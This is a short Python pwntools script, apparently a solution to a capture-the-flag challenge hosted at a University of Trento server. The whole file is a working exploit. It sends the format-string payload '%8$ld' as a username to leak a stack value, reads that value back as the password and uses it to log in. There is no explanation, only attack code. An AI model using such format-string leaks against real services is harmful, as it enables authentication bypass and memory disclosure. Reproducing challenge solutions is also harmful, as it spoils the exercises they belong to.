from pwn import *

HOST = "cyberchallenge.disi.unitn.it"
PORT = 9201
r = remote(HOST, PORT)


r.sendlineafter(
    b"username: ",
    b"%8$ld"
)

password = r.recvline().strip().split(b" ")[-1]

log.info(f"Password: {password.decode()}")

r.sendlineafter(
    b"Password: ",
    password
)

print(r.recvall().decode(errors="ignore"))
